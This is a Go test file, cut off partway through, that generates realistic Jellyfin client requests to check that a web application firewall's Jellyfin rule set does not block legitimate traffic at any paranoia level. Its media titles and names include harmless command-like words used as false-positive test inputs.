package services

import (
	"context"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"math/rand/v2"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"testing"
	"time"

	"ostiole/internal/model"
)

// jf makes what Jellyfin's clients send, from a seed: the web client, the
// Android TV client, the Roku client and a client built on the Kotlin SDK
// whose name begins like the who command, with the shapes a capture of a
// server in use and a router's log showed. Names and ids are made up.
type jf struct{ vw }

// id is a Jellyfin id as the server writes it: a GUID's 32 hex digits.
func (g jf) id() string { return hex.EncodeToString(g.bytes(16)) }

func (g jf) ticks() string { return strconv.FormatInt(g.r.Int64N(1e11), 10) }

// jfClient is one client's way of asking.
type jfClient struct {
	userAgent, auth, deviceID string
	accept                    bool   // sends an Accept header with media requests
	dashedIDs                 bool   // writes item ids with dashes
	prefs                     string // the name it keeps display settings under, where seen
	roku                      bool   // asks as the Roku client does: rokuProfile, lists joined by ", ", a My List playlist
}

// jfClients is how many clients client knows, and jfRoku the Roku client's
// n.
const jfClients, jfRoku = 4, 2

// client is client n's way of asking, n from 0 to jfClients-1.
func (g jf) client(n int) jfClient {
	token := g.id()
	switch n {
	case 0:
		ua := fmt.Sprintf("Mozilla/5.0 (X11; Linux x86_64; rv:%d.0) Gecko/20100101 Firefox/%d.0", 120+g.r.IntN(40), 120+g.r.IntN(40))
		// The web client's device id is its user agent and the time it
		// first ran, in base64 with the padding made 1s.
		dev := strings.ReplaceAll(base64.StdEncoding.EncodeToString(
			[]byte(ua+"|"+strconv.FormatInt(1600000000000+g.r.Int64N(2e11), 10))), "=", "1")
		return jfClient{ua, fmt.Sprintf(`MediaBrowser Client="Jellyfin%%20Web", Device="Firefox", DeviceId="%s", Version="10.11.%d", Token="%s"`,
			dev, g.r.IntN(9), token), dev, true, false, "emby", false}
	case 1:
		// The Kotlin SDK encodes its values as a form does.
		dev := hex.EncodeToString(g.bytes(20))
		name := url.QueryEscape(g.pick("Front Room TV", "Sam's TV (2)", "Attic Fire TV", "Büro", "LOFT Android TV"))
		return jfClient{"Jellyfin Android TV/0.19.10 via jellyfin-sdk-kotlin (OkHttp/4.12.0)",
			fmt.Sprintf(`MediaBrowser Client="Jellyfin+Android+TV", Version="0.19.10", DeviceId="%s", Device="%s", Token="%s"`, dev, name, token),
			dev, false, true, "", false}
	case jfRoku:
		dev := g.uuid() + g.pick("", "sam", "kitchen")
		return jfClient{"Roku/DVP-15.0 (15.0.4.2001-CG)",
			fmt.Sprintf(`MediaBrowser Client="Jellyfin Roku", Device="%s", Version="3.2.4", UserId="%s", DeviceId="%s", Token="%s"`,
				g.pick("50K410 (Z000X)", "Roku Ultra", "Streaming Stick 4K"), g.id(), dev, token), dev, false, false, "", true}
	default:
		dev := hex.EncodeToString(g.bytes(8))
		name := url.QueryEscape(g.pick("Den TV", "Sam's TV (2)"))
		return jfClient{"Whorlix/1.4.2-0-g3c1d2e0a via jellyfin-sdk-kotlin (OkHttp/4.12.0)",
			fmt.Sprintf(`MediaBrowser Client="Whorlix", Version="1.4.2-0-g3c1d2e0a", DeviceId="%s", Device="%s", Token="%s"`, dev, name, token),
			dev, false, true, "Whorlix", false}
	}
}

// jfRequest is one request of a client's.
type jfRequest struct {
	method, path, contentType, body string
	media                           bool // a stream or an image: no Accept from most players, and Range to seek
	client                          jfClient
}

// jfSearches are things people type to find a film, a show or a song. The
// last three are titles paranoia 3 alone refuses: a shell word after a
// question, the shell's history in "!!", a word in quotes.
var jfSearches = []string{"the night ferry", "Kite-Girl: Beyond the Kite-Line", "Hélène", "空と海の約束",
	"Salt & Pepper: Night Kitchen Unit", "(300) Nights of Winter", "Dancin' on the Pier", "Harbour: Unfinished – Low Tide",
	"ROV·R", "Rosémon", "B*R*I*G", "Who's Minding the Lighthouse?", "There Goes the Last Train!!", "Rollin' for a Stolen'"}

func (g jf) search() string { return g.pick(jfSearches...) }

// jfNames are artists, genres, people and studios, which part of the API
// names in the path. Each begins with a command's name, which CRS 4.30
// takes for a command there.
var jfNames = []string{"Watch the Tide", "Top Floor Kings", "Sleep Tight, Harbour", "Kill the Lights, Charlie",
	"Head Over Hills", "Last Train to Wexmoor", "Time Bandit Island", "Echo Valley", "Sudo Sisters", "Netcat Records",
	"Who Framed the Moon?"}

// jfImages are pictures metadata providers offer for an item, as the server
// lists them: the provider's name, with spaces in some, and the picture's
// address in that provider's shape, on a made-up host. A studio's picture is
// at an address with the studio's name in it as it is.
var jfImages = []struct{ provider, url string }{
	{"TheMovieDb", "https://image.example.org/t/p/original/7xdcg2lMLzgeonyLGcTJFiz4soC.jpg"},
	{"TheTVDB", "https://artworks.example.com/banners/v4/season/2048193/posters/ce50211670eae.jpg"},
	{"TheTVDB", "https://artworks.example.com/banners/fanart/original/81273-12.jpg"},
	{"The Open Movie Database", "https://m.media.example.com/images/M/MV5BZGI1YjVmYWItOGY0ZC00ZTI3LTlkYTEtNDk0YzczY2YyNTZkXkEyXkFqcGc@._V1_SX300.jpg"},
	{"Fanart", "https://assets.example.net/fanart/tv/90210/tvposter/lanternfall-the-long-night-of-the-paper-harbour-ferry-5f1a2b3c4d5e6.jpg"},
	{"TheAudioDB", "https://r2.example.com/images/media/album/thumb/qvxrtw1592810364.jpg"},
	{"Artwork Repository", "https://art.example.org/studios/images/Kestrel & Finch Pictures (UK)/thumb.jpg"},
	{"Artwork Repository", "https://art.example.org/studios/images/Harbour+/logo.jpg"},
	{"Artwork Repository", "https://art.example.org/studios/images/Cinéma du Port!/thumb.jpg"},
	{"Cover Art Archive", "https://coverart.example.org/release/84e55160-3200-44ea-97a9-4ded97491e23/829521842.jpg"},
	{"AniList", "https://s4.example.net/file/anilistcdn/media/anime/cover/large/bx21-CXtrrkMpJ8Zq.png"},
	{"Kitsu", "https://media.example.org/anime/poster_images/1/original.jpg?1597604210"},
}

// jfOverviews are what a metadata provider says of a film, a show, an
// episode or a person, which Identify sends back as it found it: prose with
// quotes, dashes, brackets, colons and semicolons, in English and not.
var jfOverviews = []string{
	`When the night ferry to Wexmoor vanishes in a storm, harbour pilot Mara Lune (a widow with nothing left to lose) sets out to find its "ghost" crew before the tide turns – and before the mayor's men bury the truth.`,
	"Season 2: the Kite-Line crew is back, and this summer it's personal! Three friends, one stubborn goat and a borrowed van race across the salt flats; nobody's sure they'll make it.",
	`Hélène Marchetti (born 12 March 1971 in Lyon) is a French-Italian actress & director, known for "The Night Ferry" (2019), "Paper Harbour" (2022) and her work on stage.`,
	"港町で暮らす少女ハルは、ある夜、灯台の光が消えていることに気づく。祖父の古い地図を手に、彼女は霧の向こうの島へ向かう。",
	"Ein pensionierter Uhrmacher entdeckt auf dem Dachboden einen Brief aus dem Jahr 1923 – und macht sich auf die Suche nach der Absenderin.",
	"In a city where music is outlawed, a street sweeper named Juno hides a radio under her floorboards... until the night someone else starts listening. Based on the novel by Ada Wren.",
	`Leo and Priya's plan to save the bakery goes sideways when the inspector shows up early; meanwhile, Gran's "secret recipe" turns out to be anything but.`,
}

// A subtitle file in the two common formats, and a song's timed lyrics, as
// people upload them.
const (
	jfSRT = "1\n00:00:01,000 --> 00:00:04,000\n<i>The ferry's late again...</i>\n\n2\n00:00:05,500 --> 00:00:08,250\n" +
		"\"Who's on the night shift?\" - Mara, it's you.\n"
	jfASS = "[Script Info]\nTitle: Lanternfall 01\nScriptType: v4.00+\n\n[V4+ Styles]\nFormat: Name, Fontname, Fontsize, PrimaryColour\n" +
		"Style: Default,Arial,48,&H00FFFFFF\n\n[Events]\nFormat: Layer, Start, End, Style, Text\n" +
		"Dialogue: 0,0:00:01.00,0:00:04.00,Default,{\\i1}The ferry's late again...{\\i0}\n"
	jfLRC = "[ar:Jo & the Kite-Liners]\n[ti:Lanterns at Low Tide]\n[00:12.40]Out past the harbour, where the lanterns go\n" +
		"[00:17.85]I'll wait for you - I'll wait, you know...\n"
)

// picture is a picture's file of n bytes, in base64 as the clients send it.
func (g jf) picture(n int) string { return base64.StdEncoding.EncodeToString(g.bytes(n)) }

// password is one a password manager made.
func (g jf) password() string {
	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{};:'\",.<>/?`~|\\"
	b := make([]byte, 12+g.r.IntN(20))
	for i := range b {
		b[i] = chars[g.r.IntN(len(chars))]
	}
	return string(b)
}

// cond is one of a device profile's conditions.
func (g jf) cond(prop, value string) map[string]any {
	return map[string]any{"Condition": g.pick("LessThanEqual", "EqualsAny", "NotEquals"), "Property": prop, "Value": value, "IsRequired": false}
}

// profile is c's device profile, which a client sends to be told how it
// can play an item.
func (g jf) profile(c jfClient) map[string]any {
	if c.roku {
		return g.rokuProfile(g.pick(jfRokuNames...), g.pick(jfRokuModels...))
	}
	cond := g.cond
	return map[string]any{
		"Name": g.pick("AndroidTV-Default", "Jellyfin Web"), "MaxStreamingBitrate": 120000000, "MaxStaticBitrate": 100000000,
		"MusicStreamingTranscodingBitrate": 384000,
		"DirectPlayProfiles": []any{
			map[string]any{"Container": "mp4,m4v,mkv,webm", "Type": "Video", "VideoCodec": "h264,hevc,vp9,av1", "AudioCodec": "aac,aac_latm,ac3,alac,dca,dts,eac3,flac,mp3,opus,pcm_alaw,pcm_mulaw,truehd,vorbis"},
			map[string]any{"Container": "mp3", "Type": "Audio"},
		},
		"TranscodingProfiles": []any{map[string]any{"Container": "mp4", "Type": "Video", "AudioCodec": "aac,mp3", "VideoCodec": "h264,hevc",
			"Context": "Streaming", "Protocol": "hls", "MaxAudioChannels": "6", "MinSegments": "1", "BreakOnNonKeyFrames": true}},
		"CodecProfiles": []any{
			map[string]any{"Type": "Video", "Codec": "h264", "Conditions": []any{cond("VideoProfile", "high|main|baseline|constrained baseline"), cond("VideoLevel", "52")}},
			map[string]any{"Type": "Video", "Codec": "hevc", "Conditions": []any{cond("VideoProfile", "main|main 10"), cond("VideoRangeType", "SDR|HDR10|HDR10Plus|HLG")}},
			map[string]any{"Type": "Video", "Codec": "hevc", "ApplyConditions": []any{cond("VideoRangeType", "DOVIInvalid|DOVIWithEL|DOVIWithHDR10Plus|DOVIWithELHDR10Plus")},
				"Conditions": []any{cond("IsInterlaced", "false")}},
		},
		"ResponseProfiles": []any{map[string]any{"Type": "Video", "Container": "m4v", "MimeType": "video/mp4"}},
		"SubtitleProfiles": []any{map[string]any{"Format": "vtt", "Method": "External"}, map[string]any{"Format": "ass", "Method": "Encode"}},
	}
}

// jfRokuNames are the names a Roku device has for itself: its owner's with
// all but letters, digits, spaces, dashes and underscores taken out, so
// `Den / Office` arrives with two spaces; and jfRokuModels its model's,
// Roku's own, with a plus in some.
var (
	jfRokuNames  = []string{"65 Brightwave TV", "Den  Office", "Attic Streamer ", "Streamer Ultra - X00A1B2C3D4E"}
	jfRokuModels = []string{"Streamer Ultra", "Streamer Stick 4K+", "Brightwave TV"}
)

// rokuProfile is the Roku client's device profile, which names the device
// as DLNA did, "Type: TV" for its kind. The serial number is what follows
// the model's name in the device's own, a tail that may begin with a
// space.
func (g jf) rokuProfile(name, modelName string) map[string]any {
	cond := g.cond
	number, vendor, description := g.pick("C210X", "4802X"), g.pick("Roku", "Brightwave"), "Type: "+g.pick("TV", "STB")
	video := "h264,mpeg4 avc," + g.pick("", "vp9,") + "mpeg1,hevc,h265,mpeg4,av1"
	return map[string]any{
		"Name": "Official Roku Client", "Id": g.uuid(),
		"Identification": map[string]any{"FriendlyName": name, "ModelNumber": number, "SerialNumber": "string", "ModelName": modelName,
			"ModelDescription": description, "Manufacturer": vendor},
		"FriendlyName": name, "Manufacturer": vendor, "ModelName": modelName, "ModelDescription": description, "ModelNumber": number,
		"SerialNumber": name[g.r.IntN(len(name)+1):], "MaxStreamingBitrate": 120000000, "MaxStaticBitrate": 100000000,
		"MusicStreamingTranscodingBitrate": 192000,
		"DirectPlayProfiles": []any{
			map[string]any{"Container": "mp4,m4v,mov", "Type": "Video", "VideoCodec": video, "AudioCodec": "mp3,mp2,pcm,lpcm,wav,ac3,aac,flac,alac,opus,eac3"},
			map[string]any{"Container": "mp3,mp2,flac,aac,m4a,wav,opus", "Type": "Audio"},
		},
		"TranscodingProfiles": []any{map[string]any{"Container": "ts", "Type": "Video", "AudioCodec": "aac,ac3,eac3,mp3", "VideoCodec": "hevc,h265,h264,h264,mpeg4 avc",
			"Context": "Streaming", "Protocol": "hls", "MaxAudioChannels": "6", "MinSegments": 1, "BreakOnNonKeyFrames": false, "SegmentLength": 6}},
		"ContainerProfiles": []any{},
		"CodecProfiles": []any{
			map[string]any{"Type": "Video", "Codec": "h264", "Conditions": []any{cond("VideoProfile", "baseline|constrained baseline|constrainedbaseline|high|main"),
				cond("VideoRangeType", "SDR|DOVIWithSDR"), cond("VideoLevel", "51")}},
			map[string]any{"Type": "Video", "Codec": "hevc", "Conditions": []any{cond("VideoProfile", "main|main 10"),
				cond("VideoRangeType", "SDR|DOVIWithSDR|HDR10|DOVIWithHDR10|HLG|DOVIWithHLG")}},
			map[string]any{"Type": "Video", "Codec": "vp9", "Conditions": []any{cond("VideoProfile", "profile 0|profile 2")}},
		},
		"SubtitleProfiles": []any{map[string]any{"Format": "vtt", "Method": "External"}, map[string]any{"Format": "srt", "Method": "External"}},
	}
}

// uriComponent is s as encodeURIComponent writes it: a space as %20, and
// !'()* as they are.
func uriComponent(s string) string { return uriComponentMarks.Replace(url.QueryEscape(s)) }

var uriComponentMarks = strings.NewReplacer("+", "%20", "%21", "!", "%27", "'", "%28", "(", "%29", ")", "%2A", "*")

func (g jf) progress(c jfClient) map[string]any {
	item := g.id()
	if c.dashedIDs {
		item = g.uuid()
	}
	queue := []any{}
	for i := range 1 + g.r.IntN(3) {
		queue = append(queue, map[string]any{"Id": g.id(), "PlaylistItemId": "playlistItem" + strconv.Itoa(i)})
	}
	return map[string]any{
		"VolumeLevel": 100, "IsMuted": false, "IsPaused": g.r.IntN(4) == 0, "RepeatMode": "RepeatNone", "ShuffleMode": "Sorted",
		"MaxStreamingBitrate": 140000000, "PositionTicks": g.r.Int64N(1e11), "PlaybackStartTimeTicks": g.r.Int64N(1e18),
		"PlaybackRate": 1, "SubtitleStreamIndex": -1, "AudioStreamIndex": 1,
		"BufferedRanges": []any{map[string]any{"start": 0, "end": g.r.Float64() * 1e10}}, "PlayMethod": g.pick("DirectPlay", "Transcode"),
		"PlaySessionId": g.id(), "PlaylistItemId": "playlistItem0", "MediaSourceId": g.id(), "CanSeek": true, "ItemId": item,
		"EventName": g.pick("timeupdate", "pause", "unpause"), "NowPlayingQueue": queue,
	}
}

// requests is one of everything the clients were seen to send, and the
// everyday ones a capture of an evening missed, as c sends them.
func (g jf) requests(c jfClient) []jfRequest {
	const js = "application/json"
	user, item, source, session := g.id(), g.id(), g.id(), g.id()
	stream := fmt.Sprintf("DeviceId=%s&MediaSourceId=%s&VideoCodec=av1,hevc,h264&AudioCodec=aac,opus,flac&AudioStreamIndex=1"+
		"&VideoBitrate=139616000&AudioBitrate=384000&MaxFramerate=23.976025&api_key=%s&PlaySessionId=%s&TranscodingMaxAudioChannels=2"+
		"&RequireAvc=false&EnableAudioVbrEncoding=true&Tag=%s&SegmentContainer=mp4&MinSegments=1&BreakOnNonKeyFrames=True&h264-level=40"+
		"&h264-videobitratemax=139616000&h264-profile=%s&hevc-profile=main10&av1-rangetype=SDR,HDR10,HLG&TranscodeReasons=ContainerNotSupported,AudioCodecNotSupported",
		c.deviceID, source, g.id(), session, g.id(), g.pick("high,main,baseline,constrainedbaseline", "high,main,baseline,constrainedbaseline,high10"))
	fields := "fields=PrimaryImageAspectRatio&fields=MediaSourceCount&fields=Overview&enableImageTypes=Primary&enableImageTypes=Backdrop&enableImageTypes=Thumb"
	if c.roku {
		fields = "fields=" + uriComponent(g.pick("ChildCount, ItemCounts, Genres, RecursiveItemCount", "Overview, RecursiveItemCount")) +
			"&enableImageTypes=" + uriComponent("Primary, Backdrop, Thumb")
	}
	prefs := map[string]any{"Id": g.uuid(), "SortBy": "SortName", "RememberIndexing": false, "PrimaryImageHeight": 250, "PrimaryImageWidth": 250,
		"ScrollDirection": "Horizontal", "ShowBackdrop": true, "RememberSorting": false, "SortOrder": "Ascending", "ShowSidebar": false, "Client": "emby",
		"CustomPrefs": map[string]any{"homesection0": "resume", "homesection1": "nextup", "skipForwardLength": "30000", "enableNextVideoInfoOverlay": "True",
			"tvhome": "", g.id() + "-series": `{"SortBy":"SortName","SortOrder":"Ascending"}`, g.id() + "-series-_view": "PosterCard",
			g.id() + "-movies": `{"SortBy":"PlayCount,SortName,ProductionYear","SortOrder":"Descending"}`, "subtitleeditor-language": "eng"}}
	rs := []jfRequest{
		{"GET", "/System/Info/Public", "", "", false, c},
		{"GET", "/web/config.json", "", "", false, c},
		{"GET", "/web/main.jellyfin.bundle.js?" + g.id()[:20], "", "", false, c},
		{"POST", "/Users/AuthenticateByName", js, vwJSON(map[string]any{"Username": g.pick("sam", "Jane Doe", "José"), "Pw": g.password()}), false, c},
		{"POST", "/Users/" + user + "/Password", js, vwJSON(map[string]any{"CurrentPw": g.password(), "NewPw": g.password()}), false, c},
		{"POST", "/QuickConnect/Authorize?code=" + fmt.Sprintf("%06d", g.r.IntN(1e6)) + "&userId=" + user, "", "", false, c},
		{"GET", "/socket?api_key=" + g.id() + "&deviceId=" + c.deviceID, "", "", false, c},
		{"POST", "/Sessions/Capabilities/Full", js, vwJSON(map[string]any{"PlayableMediaTypes": []string{"Audio", "Video"},
			"SupportedCommands":    []string{"MoveUp", "MoveDown", "DisplayContent", "SetSubtitleStreamIndex", "PlayMediaSource"},
			"SupportsMediaControl": true, "SupportsPersistentIdentifier": false, "DeviceProfile": g.profile(c)}), false, c},
		{"GET", "/UserViews?userId=" + user, "", "", false, c},
		{"GET", "/Users/" + user + "/Items?SortBy=SortName,ProductionYear&SortOrder=Ascending&IncludeItemTypes=Movie&Recursive=true" +
			"&Fields=PrimaryImageAspectRatio,MediaSourceCount&ImageTypeLimit=1&EnableImageTypes=Primary,Backdrop,Banner,Thumb&StartIndex=0&ParentId=" +
			g.id() + "&Limit=100", "", "", false, c},
		{"GET", "/Items?userId=" + user + "&" + fields + "&includeItemTypes=Series&recursive=true&limit=24", "", "", false, c},
		{"GET", "/Items/Latest?userId=" + user + "&limit=16&" + fields + "&parentId=" + g.id() + "&imageTypeLimit=1&groupItems=true", "", "", false, c},
		{"GET", "/Shows/NextUp?userId=" + user + "&" + fields + "&limit=24&nextUpDateCutoff=" + time.Unix(1.7e9+g.r.Int64N(1e8), 0).UTC().Format("2006-01-02") +
			"&enableTotalRecordCount=false&disableFirstEpisode=false&enableResumable=false&enableRewatching=false", "", "", false, c},
		{"GET", "/UserItems/Resume?userId=" + user + "&" + fields + "&mediaTypes=Video&limit=12", "", "", false, c},
		{"GET", "/Shows/" + item + "/Episodes?seasonId=" + g.id() + "&userId=" + user + "&Fields=ItemCounts,PrimaryImageAspectRatio,Overview", "", "", false, c},
		{"GET", "/MediaSegments/" + item + "?includeSegmentTypes=Intro&includeSegmentTypes=Outro", "", "", false, c},
		{"GET", "/System/ActivityLog/Entries?startIndex=0&limit=7&minDate=" + g.date() + "&hasUserId=false", "", "", false, c},
		{"GET", "/Items?userId=" + user + "&searchTerm=" + url.QueryEscape(g.search()) + "&" + fields + "&recursive=true&limit=24", "", "", false, c},
		{"GET", "/Items?userId=" + user + "&genres=" + url.QueryEscape(g.pick("Sci-Fi & Fantasy", "Action|Comedy", "Animation")) +
			"&studios=" + url.QueryEscape(g.pick("B12", "Studio Kestrel", "Harbour Bros. Pictures")) + "&officialRatings=PG-13&recursive=true", "", "", false, c},
		{"GET", "/Items/" + item + "/Images/Primary?fillHeight=446&fillWidth=298&quality=96&tag=" + g.id(), "", "", true, c},
		{"GET", "/Items/" + item + "/Images/Backdrop/0?tag=" + g.id() + "&maxWidth=1920&quality=80", "", "", true, c},
		{"POST", "/Items/" + item + "/PlaybackInfo?UserId=" + user + "&StartTimeTicks=" + g.ticks() + "&IsPlayback=true&AutoOpenLiveStream=true" +
			"&AudioStreamIndex=1&MediaSourceId=" + source + "&MaxStreamingBitrate=140000000", js,
			vwJSON(map[string]any{"DeviceProfile": g.profile(c), "AlwaysBurnInSubtitleWhenTranscoding": false}), false, c},
		{"GET", "/Videos/" + item + "/stream?static=true&mediaSourceId=" + source + "&deviceId=" + c.deviceID + "&api_key=" + g.id() + "&Tag=" + g.id() + "&streamOptions={}", "", "", true, c},
		{"GET", "/videos/" + item + "/master.m3u8?" + stream, "", "", true, c},
		{"GET", "/videos/" + item + "/hls1/main/" + strconv.Itoa(g.r.IntN(900)) + ".mp4?" + stream + "&runtimeTicks=" + g.ticks() + "&actualSegmentLengthTicks=" + g.ticks(), "", "", true, c},
		{"GET", "/Videos/" + item + "/" + item + "/Subtitles/" + strconv.Itoa(g.r.IntN(9)) + "/0/Stream.ass?api_key=" + g.id(), "", "", true, c},
		{"GET", "/Audio/" + item + "/universal?UserId=" + user + "&DeviceId=" + c.deviceID + "&MaxStreamingBitrate=140000000" +
			"&Container=opus,webm|opus,ts|mp3,mp3,aac,m4a|aac,m4b|aac,flac,webma,webm|webma,wav,ogg&TranscodingContainer=mp4&TranscodingProtocol=hls" +
			"&AudioCodec=aac&api_key=" + g.id() + "&PlaySessionId=" + session + "&StartTimeTicks=0&EnableRedirection=true&EnableRemoteMedia=false", "", "", true, c},
		{"GET", "/Items/" + item + "/Download?api_key=" + g.id(), "", "", true, c},
		{"POST", "/Sessions/Playing", js, vwJSON(g.progress(c)), false, c},
		{"POST", "/Sessions/Playing/Progress", js, vwJSON(g.progress(c)), false, c},
		{"POST", "/Sessions/Playing/Stopped", js, vwJSON(map[string]any{"ItemId": g.id(), "MediaSourceId": source, "PositionTicks": g.r.Int64N(1e11),
			"PlaySessionId": session, "Failed": false, "NowPlayingQueue": []any{}}), false, c},
		{"POST", "/Sessions/Playing/Ping?playSessionId=" + session, "", "", false, c},
		{"POST", "/UserFavoriteItems/" + item, "", "", false, c},
		{"DELETE", "/UserFavoriteItems/" + item, "", "", false, c},
		{"POST", "/UserPlayedItems/" + item + "?datePlayed=" + url.QueryEscape(g.date()), "", "", false, c},
		{"DELETE", "/UserPlayedItems/" + item, "", "", false, c},
		{"POST", "/UserItems/" + item + "/Rating?likes=true", "", "", false, c},
		{"DELETE", "/UserItems/" + item + "/Rating", "", "", false, c},
		{"POST", "/DisplayPreferences/usersettings?userId=" + user + "&client=emby", js, vwJSON(prefs), false, c},
		{"POST", "/Playlists", js, vwJSON(map[string]any{"Name": g.pick("Road trip", "Kids' films", "Sunday (slow)", "Musique d'été"),
			"Ids": []string{g.id(), g.id()}, "UserId": user, "MediaType": "Audio"}), false, c},
		{"DELETE", "/Playlists/" + item + "/Items?entryIds=" + g.id() + "," + g.id(), "", "", false, c},
		{"POST", "/SyncPlay/New", js, vwJSON(map[string]any{"GroupName": g.pick("Movie night", "Sam's room")}), false, c},
		{"POST", "/SyncPlay/Buffering", js, vwJSON(map[string]any{"When": g.date(), "PositionTicks": g.r.Int64N(1e11), "IsPlaying": true,
			"PlaylistItemId": g.uuid()}), false, c},
		// The web client sends its log as text; one seen on a router came
		// as a form.
		{"POST", "/ClientLog/Document", g.pick("text/plain", "application/x-www-form-urlencoded"), "[2026-09-28T21:04:31.000Z] TypeError: Cannot read properties of undefined (reading 'Id')\n" +
			"    at Object.<anonymous> (https://watch.example.com/web/main.jellyfin.bundle.js:2:34567)\n    at x.play (playbackmanager.js:1:2)\n", false, c},
		{"POST", "/Items/RemoteSearch/Series", js, vwJSON(map[string]any{"SearchInfo": map[string]any{"Name": g.pick("Lanternfall", "Paper Harbour"),
			"Year": 2019, "ProviderIds": map[string]any{"Tvdb": "", "Imdb": "", "Tmdb": ""}}, "ItemId": item, "IncludeDisabledProviders": true}), false, c},
		{"POST", "/Items/RemoteSearch/Apply/" + item + "?ReplaceAllImages=true", js, vwJSON(map[string]any{"Name": "Lanternfall (2019)",
			"ProviderIds": map[string]any{"AniDB": "14000"}, "ProductionYear": 2019, "PremiereDate": "2019-04-05T00:00:00.0000000Z",
			"ImageUrl": "https://cdn.example.org/images/main/" + strconv.Itoa(g.r.IntN(1e6)) + ".jpg", "SearchProviderName": "AniDB"}), false, c},
		{"POST", "/Items/" + item + "/Refresh?Recursive=true&ImageRefreshMode=Default&MetadataRefreshMode=Default&ReplaceAllImages=false" +
			"&RegenerateTrickplay=false&ReplaceAllMetadata=false", "", "", false, c},
		// The dashboard's devices, named by the id each client sends.
		{"GET", "/Devices/Info?id=" + c.deviceID, "", "", false, c},
		{"GET", "/Devices/Options?id=" + c.deviceID, "", "", false, c},
		{"DELETE", "/Devices?id=" + c.deviceID, "", "", false, c},
	}
	if c.prefs != "" {
		rs = append(rs, jfRequest{"GET", "/DisplayPreferences/" + g.pick("default", "usersettings") + "?userId=" + g.uuid() + "&client=" + c.prefs, "", "", false, c})
	}
	if c.roku {
		// The home rows, with the names in lower case, and My List, a
		// playlist named in bars.
		rows := "enableimagetypes=" + uriComponent("Primary, Backdrop, Thumb") + "&enabletotalrecordcount=false&imagetypelimit=1&limit=25&userid=" + user
		rs = append(rs,
			jfRequest{"GET", "/items/latest?" + rows + "&fields=Genres&parentid=" + g.id(), "", "", false, c},
			jfRequest{"GET", "/livetv/programs/recommended?" + rows + "&fields=ChannelInfo%2CPrimaryImageAspectRatio&isairing=true", "", "", false, c},
			jfRequest{"GET", "/Items?userid=" + user + "&includeItemTypes=Playlist&nameStartsWith=" + uriComponent("|My List|") + "&parentId=" + g.id(), "", "", false, c},
			jfRequest{"POST", "/Playlists", js, vwJSON(map[string]any{"name": "|My List|", "ids": []string{g.id()}, "userid": user, "mediatype": "Unknown",
				"users": []any{map[string]any{"userid": user, "canedit": true}}, "ispublic": false}), false, c},
		)
	}
	return rs
}

// jfSend sends r to the Jellyfin site at addr as r's client does, and
// returns the status.
func jfSend(t *testing.T, addr string, r jfRequest) int {
	t.Helper()
	return jfSendWith(t, addr, r, nil)
}

// jfSendWith is jfSend with headers added or replaced.
func jfSendWith(t *testing.T, addr string, r jfRequest, headers map[string]string) int {
	t.Helper()
	tr := &http.Transport{DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
		var d net.Dialer
		return d.DialContext(ctx, network, addr)
	}}
	defer tr.CloseIdleConnections()
	req, err := http.NewRequestWithContext(t.Context(), r.method, "http://watch.example.com"+r.path, strings.NewReader(r.body))
	if err != nil {
		t.Fatal(err)
	}
	if r.contentType != "" {
		req.Header.Set("Content-Type", r.contentType)
	}
	if !r.media || r.client.accept {
		req.Header.Set("Accept", "application/json")
	}
	if r.media {
		req.Header.Set("Range", "bytes=0-")
	}
	req.Header.Set("Authorization", r.client.auth)
	req.Header.Set("User-Agent", r.client.userAgent)
	if r.client.roku && strings.Contains(r.path, "/hls1/") {
		_, query, _ := strings.Cut(r.path, "?")
		req.Header.Set("Cmcd-Request", `mtp=81200,su,bl=0,nor="1.ts?`+query+`"`)
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := (&http.Client{Transport: tr, Timeout: 10 * time.Second}).Do(req)
	if err != nil {
		t.Fatalf("%s %s: %v", r.method, r.path, err)
	}
	_ = resp.Body.Close()
	return resp.StatusCode
}

// watchSite runs the sidecar with one Jellyfin site at paranoia pl,
// blocking, with the set loaded or not.
func watchSite(t *testing.T, pl int, set bool) (string, *lockedBuffer) {
	t.Helper()
	profile := model.WAFProfile{ID: "watch", Mode: "block", Paranoia: pl}
	if set {
		profile.Applications = []string{"jellyfin"}
	}
	cfg := &model.Config{}
	cfg.Services.Proxy = model.Proxy{
		Enabled: true, HTTPPort: freePort(t), HTTPSPort: freePort(t),
		Pools:    []model.ProxyPool{{ID: "jellyfin", Upstreams: []model.ProxyUpstream{{Address: answer(t, "{}")}}}},
		Profiles: []model.WAFProfile{profile},
		Sites: []model.ProxySite{{ID: "watch", Enabled: true, Hosts: []string{"watch.example.com"}, Pool: "jellyfin",
			PlainHTTP: true, WAF: "watch"}},
	}
	plain, _, out := runSidecar(t, sidecar(t), cfg, "", map[string][]string{model.SelfCertificate: {"127.0.0.1"}})
	return plain, out
}

// What Jellyfin's clients send passes at every paranoia level with the set
// loaded, where at paranoia 4 without it nearly every request is refused.
func TestTheJellyfinSetLetsItsClientsThrough(t *testing.T) {
	t.Parallel()
	for pl := 1; pl <= 4; pl++ {
		t.Run(fmt.Sprintf("paranoia %d", pl), func(t *testing.T) {
			t.Parallel()
			plain, out := watchSite(t, pl, true)
			g := jf{vw{rand.New(rand.NewPCG(uint64(pl), 2))}}
			for _, term := range jfSearches {
				r := jfRequest{"GET", "/Items?userId=" + g.id() + "&searchTerm=" + url.QueryEscape(term) + "&recursive=true", "", "", false, g.client(g.r.IntN(jfClients))}
				if status := jfSend(t, plain, r); status != http.StatusOK {
					t.Errorf("a search for %q: %d", term, status)
				}
			}
			for _, name := range jfRokuNames {
				for _, modelName := range jfRokuModels {
					r := jfRequest{"POST", "/Sessions/Capabilities/Full", "application/json",
						vwJSON(map[string]any{"DeviceProfile": g.rokuProfile(name, modelName)}), false, g.client(jfRoku)}
					if status := jfSend(t, plain, r); status != http.StatusOK {
						t.Errorf("a Roku device named %q, a %q: %d", name, modelName, status)
					}
				}
			}
			for _, name := range jfNames {
				n, c := uriComponent(name), g.client(g.r.IntN(jfClients))
				for _, r := range []jfRequest{
					{"GET", "/Persons/" + n + "/Images/Primary?fillHeight=300&quality=96&tag=" + g.id(), "", "", true, c},
					{"GET", "/Genres/" + n + "?userId=" + g.id(), "", "", false, c},
					{"GET", "/MusicGenres/" + n + "?userId=" + g.id(), "", "", false, c},
					{"GET", "/Artists/" + n + "?userId=" + g.id(), "", "", false, c},
